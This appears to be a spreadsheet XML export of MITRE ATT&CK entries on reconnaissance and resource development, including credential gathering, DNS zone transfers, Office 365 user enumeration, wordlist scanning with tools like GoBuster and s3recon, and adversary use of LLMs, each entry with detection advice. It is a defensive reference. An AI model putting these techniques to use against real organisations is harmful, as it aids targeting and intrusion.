An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.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</si>
  <si>
    <t xml:space="preserve">
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits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</si>
  <si>
    <t>T1588.006</t>
  </si>
  <si>
    <t>Vulnerabilities (T1588.006)</t>
  </si>
  <si>
    <t>Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)
An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).</t>
  </si>
  <si>
    <t>Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities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</si>
  <si>
    <t>T1588.007</t>
  </si>
  <si>
    <t>Artificial Intelligence (T1588.007)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI)
For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI)
</t>
  </si>
  <si>
    <t>T1589</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)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[Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).</t>
  </si>
  <si>
    <t>Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.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</si>
  <si>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T1589.001</t>
  </si>
  <si>
    <t>Credentials (T1589.001)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.
Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)
Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping Computer Stealer Logs 2023)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[External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). </t>
  </si>
  <si>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</si>
  <si>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T1589.002</t>
  </si>
  <si>
    <t>Email Addresses (T1589.002)</t>
  </si>
  <si>
    <t>Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.
Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)
Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).</t>
  </si>
  <si>
    <t>Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.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</si>
  <si>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T1589.003</t>
  </si>
  <si>
    <t>Employee Names (T1589.003)</t>
  </si>
  <si>
    <t>Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.
Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)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[Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).</t>
  </si>
  <si>
    <t>T1590</t>
  </si>
  <si>
    <t>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Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks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</si>
  <si>
    <t>T1590.001</t>
  </si>
  <si>
    <t>Domain Properties (T1590.001)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).</t>
  </si>
  <si>
    <t>T1590.002</t>
  </si>
  <si>
    <t>DNS (T1590.002)</t>
  </si>
  <si>
    <t>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records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)
Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).
Adversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation: DNS-CISA)(Citation: Alexa-dns)</t>
  </si>
  <si>
    <t>T1590.003</t>
  </si>
  <si>
    <t>Network Trust Dependencies (T1590.003)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests)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</si>
  <si>
    <t>T1590.004</t>
  </si>
  <si>
    <t>Network Topology (T1590.004)</t>
  </si>
  <si>
    <t>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and other infrastructure.
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)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t>
  </si>
  <si>
    <t>T1590.005</t>
  </si>
  <si>
    <t>IP Addresses (T1590.005)</t>
  </si>
  <si>
    <t>Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses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t>
  </si>
  <si>
    <t>T1590.006</t>
  </si>
  <si>
    <t>Network Security Appliances (T1590.006)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)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t>
  </si>
  <si>
    <t>T1591</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: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 or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).</t>
  </si>
  <si>
    <t>T1591.001</t>
  </si>
  <si>
    <t>Determine Physical Locations (T1591.001)</t>
  </si>
  <si>
    <t>Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: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[Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).</t>
  </si>
  <si>
    <t>T1591.002</t>
  </si>
  <si>
    <t>Business Relationships (T1591.002)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships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[Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).</t>
  </si>
  <si>
    <t>T1591.003</t>
  </si>
  <si>
    <t>Identify Business Tempo (T1591.003)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo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[Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))</t>
  </si>
  <si>
    <t>T1591.004</t>
  </si>
  <si>
    <t>Identify Roles (T1591.004)</t>
  </si>
  <si>
    <t>Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles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t>
  </si>
  <si>
    <t>T1592</t>
  </si>
  <si>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t>
  </si>
  <si>
    <t>Internet scanners may be used to look for patterns associated with malicious content designed to collect host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</si>
  <si>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T1592.001</t>
  </si>
  <si>
    <t>Hardware (T1592.001)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure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[Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).</t>
  </si>
  <si>
    <t>Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware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</si>
  <si>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T1592.002</t>
  </si>
  <si>
    <t>Software (T1592.002)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software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for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).</t>
  </si>
  <si>
    <t>Internet scanners may be used to look for patterns associated with malicious content designed to collect host software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</si>
  <si>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T1592.003</t>
  </si>
  <si>
    <t>Firmware (T1592.003)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).
Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel)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[Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).</t>
  </si>
  <si>
    <t>T1592.004</t>
  </si>
  <si>
    <t>Client Configurations (T1592.004)</t>
  </si>
  <si>
    <t>Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.
Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations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t>
  </si>
  <si>
    <t>Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration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</si>
  <si>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T1593</t>
  </si>
  <si>
    <t>Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)
Adversaries may search in different online sites depending on what information they seek to gather.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[External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).</t>
  </si>
  <si>
    <t>T1593.001</t>
  </si>
  <si>
    <t>Social Media (T1593.001)</t>
  </si>
  <si>
    <t>Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.
Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media)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[Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).</t>
  </si>
  <si>
    <t>T1593.002</t>
  </si>
  <si>
    <t>Search Engines (T1593.002)</t>
  </si>
  <si>
    <t>Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)
Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials.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[Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).</t>
  </si>
  <si>
    <t>T1593.003</t>
  </si>
  <si>
    <t>Code Repositories (T1593.003)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  
Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). 
**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. </t>
  </si>
  <si>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</si>
  <si>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T1594</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)
Adversaries may search victim-owned websites to gather actionable information.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[Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).
In addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap XML 2023)(Citation: Register Robots TXT 2015) </t>
  </si>
  <si>
    <t>Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.</t>
  </si>
  <si>
    <t>T1595</t>
  </si>
  <si>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 including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting)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</si>
  <si>
    <t>Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.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</si>
  <si>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T1595.001</t>
  </si>
  <si>
    <t>Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.
Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan)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t>
  </si>
  <si>
    <t>Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).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</si>
  <si>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T1595.002</t>
  </si>
  <si>
    <t>Vulnerability Scanning (T1595.002)</t>
  </si>
  <si>
    <t>Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.
These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning)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[Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).</t>
  </si>
  <si>
    <t>T1595.003</t>
  </si>
  <si>
    <t>Wordlist Scanning (T1595.003)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).
For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  
As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. </t>
  </si>
  <si>
    <t>Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Monitor for access to S3 buckets, especially those that are not intended to be publicly accessible.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</si>
  <si>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T1596</t>
  </si>
  <si>
    <t>Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)
Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)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</si>
  <si>
    <t>T1596.001</t>
  </si>
  <si>
    <t>DNS/Passive DNS (T1596.001)</t>
  </si>
  <si>
    <t>Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.
Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)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</si>
  <si>
    <t>T1596.002</t>
  </si>
  <si>
    <t>WHOIS (T1596.002)</t>
  </si>
  <si>
    <t>Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)
Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)),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</si>
  <si>
    <t>T1596.003</t>
  </si>
  <si>
    <t>Digital Certificates (T1596.003)</t>
  </si>
  <si>
    <t>Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.
Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).</t>
  </si>
  <si>
    <t>T1596.004</t>
  </si>
  <si>
    <t>CDNs (T1596.004)</t>
  </si>
  <si>
    <t>Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.
